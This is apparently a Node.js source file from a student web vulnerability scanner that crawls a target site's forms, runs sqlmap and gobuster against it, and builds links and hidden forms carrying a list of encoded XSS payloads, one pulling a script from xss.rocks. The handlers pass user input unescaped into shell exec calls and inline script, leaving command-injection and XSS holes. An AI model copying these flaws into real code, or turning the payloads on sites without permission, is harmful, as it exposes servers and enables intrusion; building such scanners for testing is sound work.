var querystring = require("querystring");var fs = require('fs');function start(request, response, postData) {	var  scan_body = require('./static/auth_body');	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + "<h3>Enter a target and choose an action</h3>" +scan_body.footer);	response.end();}function info(request, response, postData) {	var  scan_body = require('./static/auth_body');	if (postData){	const exec = require('child_process').exec;	exec('bash ./tools/getinfo.sh '+querystring.parse(postData).target, (error, stdout, stderr) => {  	  if (error) {			response.writeHead(200, {"Content-Type": "text/html"});    		response.write(scan_body.header + '<h2>Site Info</h2>'+ '<p>'+`Exec error: ${error}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);			console.error(`exec error: ${error}`);			response.end();    		return;  	  }  	  //console.log(`stdout: ${stdout}`);  	  //console.log(`stderr: ${stderr}`);	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + '<h2>Site Info</h2>'+ '<p>'+`${stdout}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);	response.end();	});	}	else {	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + scan_body.footer);	response.end();	}}function injections(request, response, postData) {	var jsdom = require("jsdom");		function attack(document) {		var forms = document.querySelectorAll('form');		var huckbase = new Array();		huckbase = [];		var params = new Array();		var actions = new Array();		var methods = new Array();		var sqlmap_req='sqlmap --timeout=5 -v 2 --dbs -u ';		var sql_post='';		for (var i=0;i<forms.length;i++){			params[i]=[];			for (var j=0;j<forms[i].elements.length;j++){				if(forms[i].elements[j].name)					params[i].push(forms[i].elements[j].name);			}			if(forms[i].action!='')				actions[i]=forms[i].action;			if(forms[i].method)				methods[i]=forms[i].method;			else				methods[i]='get';		}		huckbase.push(actions);		huckbase.push(methods);		huckbase.push(params);		var attack_list = new Array();		console.log(huckbase);		response.writeHead(200, {"Content-Type": "text/html"});		if (actions.length!=0){			console.log("Length of Actions array: " + actions.length);			for(var i=0;i<actions.length;i++){				if(actions[i].indexOf('file:///root/Documents/diplom/checkingpage.html')==0){					actions[i] = '/';				}				if(actions[i].indexOf('file:///root/Documents/diplom/')==0){					actions[i] = actions[i].slice(30);				}				if(actions[i].indexOf('file://')==0){					actions[i] = actions[i].slice(7);				}				if(actions[i].indexOf('http')==-1&&actions[i].indexOf('/')!=0){					actions[i] = '/'+ actions[i];				}				if(actions[i].indexOf('http')==-1){					if(querystring.parse(postData).target.indexOf('http://')==-1)						attack_list[i]='http://'+querystring.parse(postData).target + actions[i];					else						attack_list[i]=querystring.parse(postData).target + actions[i];				}				if(actions[i].indexOf('http')==0){					attack_list[i]=actions[i];				}				if (methods[i]!='post'){					if(params[i]){ 						var tail = '';						for(var j=0;j<params[i].length;j++){							tail+=params[i][j]+'=1'+'&';						}						if(sqlmap_req.indexOf('http')==-1){							sqlmap_req+=attack_list[i]+'/?';						}						sqlmap_req+=tail;						console.log(sqlmap_req);					}				}				else{					if(params[i]){ 						if(sql_post.indexOf('http')==-1)							sql_post+=attack_list[i];						if(sql_post.indexOf('--data')==-1)							sql_post+=' --data="'						else							sql_post.slice(0, -1);						var tail = '';						for(var j=0;j<params[i].length;j++){							tail+=params[i][j]+'=1'+'&';						}							sql_post+=tail+'"';							//console.log(sql_post);							break;					}				}			}			sqlmap_req+=' '+sql_post+'--batch | sed \'s/$/ <br>/\'';			console.log(sqlmap_req);			const exec = require('child_process').exec;			exec(sqlmap_req, (error, stdout, stderr) => {			  if (error) {					response.writeHead(200, {"Content-Type": "text/html"});					response.write(scan_body.header + '<h2>SQL Injections</h2>'+ '<p>'+`Exec error: ${error}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);					console.error(`exec error: ${error}`);					response.end();					return;			  }			response.writeHead(200, {"Content-Type": "text/html"});			response.write(scan_body.header + '<h2>SQL Injections</h2>'			+'<h4>'			+'Form handlers:</h4><p>'+attack_list			+'</p><h4>Methods:</h4><p>'+methods			+'</p><h4>Parametrs:</h4><p>'+params			+'</p><h4>SQLMAP Request:</h4><p>'+sqlmap_req			+'</p><h4>Result:</h4><p>'+`${stdout}`			+'</p>'			+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);			response.end();			});		}		else{			console.log('There are no form handlers');			response.write(scan_body.header + '<h2>SQL Injections</h2>'+ '<h4>There are no form handlers here</h4>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);			response.end();		}	}		var  scan_body = require('./static/auth_body');	if (postData){		var req = '';		if(querystring.parse(postData).target.indexOf('http')==0)			req=querystring.parse(postData).target		else req='http://'+querystring.parse(postData).target;		jsdom.env(		  req,		  function (err, window) {			console.log(window.document);			attack(window.document);		  }		);	}	else {	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + scan_body.footer);	response.end();	}}function xss(request, response, postData) {	var jsdom = require("jsdom");		function showForms(document) {		var forms = document.querySelectorAll('form');		var huckbase = new Array();		huckbase = [];		var params = new Array();		var actions = new Array();		var methods = new Array();		for (var i=0;i<forms.length;i++){			params[i]=[];			for (var j=0;j<forms[i].elements.length;j++){				if(forms[i].elements[j].name)					params[i].push(forms[i].elements[j].name);			}			if(forms[i].action!='')				actions[i]=forms[i].action;			if(forms[i].method)				methods[i]=forms[i].method;			else				methods[i]='get';		}		huckbase.push(actions);		huckbase.push(methods);		huckbase.push(params);		console.log(huckbase);		var attack_list = new Array();		var Ready_base = new Array();		Ready_base = [];		var post_base = new Array();		post_base = [];		var vectors = ['%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E','%22%3E%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E','javascript%3A%2F*--%3E%3C%2Fmarquee%3E%3C%2Fscript%3E%3C%2Ftitle%3E%3C%2Ftextarea%3E%3C%2Fnoscript%3E%3C%2Fstyle%3E%3C%2Fxmp%3E%22%3E%5Bimg%3D1%5D%3Cimg%20-%2Fstyle%3D-%3Dexpression%26%2340%26%2347%3B%26%2342%3B%E2%80%99%2F-%2F*%26%2339%3B%2C%2F**%2Feval(name)%2F%2F%26%2341%3B%3Bwidth%3A100%25%3Bheight%3A100%25%3Bposition%3Aabsolute%3Bbehavior%3Aurl(%23default%23VML)%3B-o-link%3Ajavascript%3Aeval(title)%3B-o-link-source%3Acurrent%20name%3Dalert(1)%20onerror%3Deval(name)%20src%3D1%20autofocus%20onfocus%3Deval(name)%20onclick%3Deval(name)%20onmouseover%3Deval(name)%20background%3Djavascript%3Aeval(name)%2F%2F%3E%22','%3Cscript%3Ealert(String.fromCharCode(88%2C83%2C83))%3C%2Fscript%3E','%22%3E%3Cscript%3Ealert(String.fromCharCode(88%2C83%2C83)%3C%2Fscript%3E','%3CSCRIPT%3Ealert(String.fromCharCode(88%2C83%2C83))%3C%2FSCRIPT%3E','%3CSCRIPT%20SRC%3Dhttp%3A%2F%2Fxss.rocks%2Fxss.js%3E%3C%2FSCRIPT%3E','%22%20onload%3D%22alert((String.fromCharCode(88%2C83%2C83))%22%3E%3Cimg','%27%60%22%3E%3C%5Cx00script%3Ejavascript%3Aalert(String.fromCharCode(88%2C83%2C83))%3C%2Fscript%3E','--%3E%3C!--%20--%5Cx3E%3E%20%3Cimg%20src%3Dxxx%3Ax%20onerror%3Djavascript%3Aalert(String.fromCharCode(88%2C83%2C83))%3E%20--%3E','javascript%3A%2F*--%3E%3C%2Fscript%3E%3C%2Ftitle%3E%3C%2Ftextarea%3E%3C%2Fnoscript%3E%3C%2Fstyle%3E%3C%2Fxmp%3E%3C%2Fnoembed%3E%3C%2Fcomment%3E%3C%2Fxml%3E%3C%2Fiframe%3E%22%3E%5Bimg%3D1%5D%3Cimg%20-%2Fstyle%3D-%3Dexpression%26%2340%26%2347%3B%26%2342%3B%E2%80%99%2F-%2F*%26%2339%3B%2C%2F**%2Feval(name)%2F%2F%26%2341%3B%3Bwidth%3A100%25%3Bheight%3A100%25%3Bposition%3Aabsolute%3B%20name%3Dalert(1)%20onerror%3Deval(name)%20src%3D1%20autofocus%20onfocus%3Deval(name)%20onclick%3Deval(name)%20onmouseover%3Deval(name)%20background%3Djavascript%3Aeval(name)%2F%2F%3E%22','%27%3Balert(String.fromCharCode(88%2C83%2C83))%2F%2F%27%3Balert(String.fromCharCode(88%2C83%2C83))%2F%2F%22%3B%0Aalert(String.fromCharCode(88%2C83%2C83))%2F%2F%22%3Balert(String.fromCharCode(88%2C83%2C83))%2F%2F--%0A%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88%2C83%2C83))%3C%2FSCRIPT%3E'];		var attack_post = '';		//var vectors = ['vect1','vect2','vect3'];		response.writeHead(200, {"Content-Type": "text/html"});		if (actions.length!=0){			console.log("Length of Actions array: " + actions.length);			for(var i=0;i<actions.length;i++){				if(actions[i].indexOf('file:///root/Documents/diplom/checkingpage.html')==0){					actions[i] = '/';				}				if(actions[i].indexOf('file:///root/Documents/diplom/')==0){					actions[i] = actions[i].slice(30);				}				if(actions[i].indexOf('file://')==0){					actions[i] = actions[i].slice(7);				}				if(actions[i].indexOf('http')==-1&&actions[i].indexOf('/')!=0){					actions[i] = '/'+ actions[i];				}				if(actions[i].indexOf('http')==-1){					if(querystring.parse(postData).target.indexOf('http://')==-1)						attack_list[i]='http://'+querystring.parse(postData).target + actions[i];					else						attack_list[i]=querystring.parse(postData).target + actions[i];				}				if(actions[i].indexOf('http')==0){					attack_list[i]=actions[i];				}				if (methods[i]!='post'){					if(params[i]){ 						for(var k=0;k<vectors.length;k++){							var tail = '';							for(var j=0;j<params[i].length;j++){								tail+='&amp;'+params[i][j]+'='+vectors[k];							}							Ready_base.push(attack_list[i]+'/?'+tail);						}					}				}				else{					if(params[i]){ 						for(var k=0;k<vectors.length;k++){							var tail = '<form style="display:none;" action="'+attack_list[i]+'" method="post" id="form_'+(i+'_'+k)+'">';							attack_post+='<a href=\'javascript:document.getElementById("form_'+i+'_'+k+'").submit()\' target="_blank"> Vector '+i+'_'+k+'</a><br>';							for(var j=0;j<params[i].length;j++){								tail+='<input name="'+params[i][j]+'" value="'+vectors[k]+'">';							}							tail+='</form>';							post_base.push(tail);						}					}					//console.log(post_base);				}			}			var attack = '';			for (var i=0;i<Ready_base.length;i++){				attack+='<a href="'+Ready_base[i]+'" target="_blank"> Vector '+i+'</a><br>';			}			var post_div = '';			for (var i=0;i<post_base.length;i++){				post_div+=post_base[i];			}			response.write(scan_body.header + '<h2>Cross Site Scripting (XSS)</h2>'			+'<h4>'			+'Form handlers:</h4><p>'+actions			+'</p><h4>Methods:</h4><p>'+methods			+'</p><h4>Parametrs:</h4><p>'+params			+'</h4>'			+'<h4>Attack with GET method </h4><p>'			+attack			+'</p>'			+'<h4>Attack with POST method </h4><p>'			+'<div style="display:none;">'			+post_div			+'</div>'			+attack_post			+'</p>'			+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);		}		else{			console.log('There are no form handlers');			response.write(scan_body.header + '<h2>Cross Site Scripting (XSS)</h2>'+ '<h4>There are no form handlers here</h4>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);		}		response.end();			}		var  scan_body = require('./static/auth_body');	if (postData){		var req = '';		if(querystring.parse(postData).target.indexOf('http')==0)			req=querystring.parse(postData).target		else req='http://'+querystring.parse(postData).target;		jsdom.env(		  req,		  function (err, window) {			console.log(window.document);			showForms(window.document);		  }		);	}	else {	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + scan_body.footer);	response.end();	}}function direct(request, response, postData) {	var  scan_body = require('./static/auth_body');	if (postData){	const exec = require('child_process').exec;	exec('./tools/gobuster.sh '+querystring.parse(postData).target, (error, stdout, stderr) => {  	  if (error) {			response.writeHead(200, {"Content-Type": "text/html"});    		response.write(scan_body.header + '<h2>Unsecure Direct Access</h2>'+ '<p>'+`Exec error: ${error}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);			console.error(`exec error: ${error}`);			response.end();    		return;  	  }	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + '<h2>Unsecure Direct Access</h2>'+ '<p>'+`${stdout}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);	response.end();	});	}	else {	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + scan_body.footer);	response.end();	}}function recomends(request, response, postData) {		var http = require('http');	var  scan_body = require('./static/auth_body');	if (postData){		var options = {method: 'HEAD', host: querystring.parse(postData).target, port: 80};		var req = http.request(options, function(res) {			console.log(JSON.stringify(res.headers));			response.writeHead(200, {"Content-Type": "text/html"});			response.write(scan_body.header + '<h2>OWASP Recommendations</h2>'+JSON.stringify(res.headers)+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);			response.end();		  }		);		req.end();	}	else {	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + scan_body.footer);	response.end();	}}function known(request, response, postData) {	var  scan_body = require('./static/auth_body');	if (postData){		const exec = require('child_process').exec;		exec('bash ./tools/knownvuls.sh '+querystring.parse(postData).target, (error, stdout, stderr) => {		  if (error) {				response.writeHead(200, {"Content-Type": "text/html"});				response.write(scan_body.header + '<h2>Using Components with Known Vulnerabilities</h2>'+ '<p>'+`Exec error: ${error}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);				console.error(`exec error: ${error}`);				response.end();				return;		  }			response.writeHead(200, {"Content-Type": "text/html"});			response.write(scan_body.header + '<h2>Using Components with Known Vulnerabilities</h2>'+ '<p>'+`${stdout}`+'</p>'+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);			response.end();		});	}	else {		response.writeHead(200, {"Content-Type": "text/html"});		response.write(scan_body.header + scan_body.footer);		response.end();	}}function redirs(request, response, postData) {		var http = require('http');	var  scan_body = require('./static/auth_body');	if (postData){		var options = {method: 'HEAD', host: querystring.parse(postData).target, port: 80};		var req = http.request(options, function(res) {			console.log(JSON.stringify(res.headers));			response.writeHead(200, {"Content-Type": "text/html"});			response.write(scan_body.header + '<h2>Unsafe Redirects</h2>'+JSON.stringify(res.headers)+'<script>document.getElementsByName("target")[0].value="'+querystring.parse(postData).target+'"</script>'+scan_body.footer);			response.end();		  }		);		req.end();	}	else {	response.writeHead(200, {"Content-Type": "text/html"});	response.write(scan_body.header + scan_body.footer);	response.end();	}}exports.start = start;exports.info = info;exports.injections = injections;exports.xss = xss;exports.direct = direct;exports.recomends = recomends;exports.known = known;exports.redirs = redirs;  